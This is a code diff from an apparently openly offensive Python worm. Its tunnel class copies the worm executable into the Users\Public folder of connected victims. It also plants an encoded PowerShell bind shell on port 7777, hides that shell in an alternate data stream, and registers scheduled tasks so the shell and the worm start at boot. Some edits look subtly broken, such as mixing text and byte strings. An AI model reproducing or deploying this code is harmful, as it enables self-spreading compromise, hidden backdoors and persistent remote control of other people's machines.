@@ -1,18 +1,15 @@
 import socket, threading
-import time
+import time, select
 from replicate import replicate
 from deployment import deployment
 
-
 class tunnel(threading.Thread):
     
-    def __init__(self, worm, lhost="0.0.0.0", lport=1337):
+    def __init__(self, worm, sock, lhost="0.0.0.0", lport=1337):
         self.worm = worm
         self.lhost = lhost
         self.lport = lport
-        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.sock.bind((self.lhost,self.lport))
-        self.sock.listen(5)
+        self.sock = sock
         print("Establishing Tunnel - listening on port {}".format(self.lport))
         self.connection = {}
         super().__init__()
@@ -24,10 +21,10 @@ class tunnel(threading.Thread):
         conn.settimeout(10)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
-        self.deploy_virus(self.worm.getfiledata(),conn)
-        self.create_persistence(conn)
+        dir = "\\Users\Public\\"
+        self.deploy_virus(self.worm.getfiledata(),conn, dir)
+        self.create_persistence(conn, dir)
         conn.close()
-        self.sock.close()
     
     
     def sent_command(self, command, conn):
@@ -43,8 +40,15 @@ class tunnel(threading.Thread):
             if sent == 0:
                 raise RuntimeError("socket connection broken")
             total_sent = total_sent + sent
+
         
     def get_response(self,conn,size=1024):
+        response = conn.recv(size).decode()
+        return response
+    
+    def get_large_response(self, conn, size=8192):
+        while not select.select([conn], [], [], 0.0)[0]:
+            time.sleep(1)
         response = conn.recv(size).decode()
         return response
 
@@ -79,23 +83,25 @@ class tunnel(threading.Thread):
         else:
             return ""
 
-    def create_persistence(self, conn):
+    def create_persistence(self, conn, dir):
         #creating a backdoor access on the remote server
         command = b"powershell -encodedcommand "
         command += self.generate_base64_bind_shell_code("windows").encode()
         command+=b"\n"
         self.sent_command(command,conn)
         print("Create a Bind Shell on Port 7777")
-        print(self.get_response(conn,5120))
+        print(self.get_response(conn,8192))
 
         command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
         command += self.generate_base64_bind_shell_code("windows").encode()
         command += b'"'
-        self.sent_large_command(command,conn)
+        command+=b"\n"
+        self.sent_command(command,conn)
         print("Store Base64 Bind Shell in Temp Folder")
-        print(self.get_response(conn,5120))
+        print(self.get_response(conn,8192))
         
-        command = b'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
+        command = 'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
+        command+=b"\n"
         self.sent_command(command,conn)
         print("Create a Schedule Tasks to Start the Bind Shell on Boot")
         print(self.get_response(conn,1024))
@@ -111,11 +117,11 @@ class tunnel(threading.Thread):
             self.deploy_to_linux(conn)
             
             
-    def depoly_to_windows(self,conn):
+    def depoly_to_windows(self,conn, dir):
         #start command sequence
         try:
             print("Start Deploying worm to Windows")
-            command = "cd \\Users\Public".encode()
+            command = "cd {}".format(dir).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("change to users directory")
@@ -145,6 +151,12 @@ class tunnel(threading.Thread):
             print("Target Response: {}".format(self.get_response(conn,1024)))
             time.sleep(5)
             command = "./{}_tworm.exe".format(self.lhost).encode()
+            command+=b"\n"
+            self.sent_command(command,conn)
+            print("Target Response: {}".format(self.get_response(conn,1024)))
+            
+            #Setup Self execute on startup
+            command = 'schtasks /create /tn "scannerr" /tr "C:{}{}_tworm.exe" /sc onstart'.format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn,1024)))
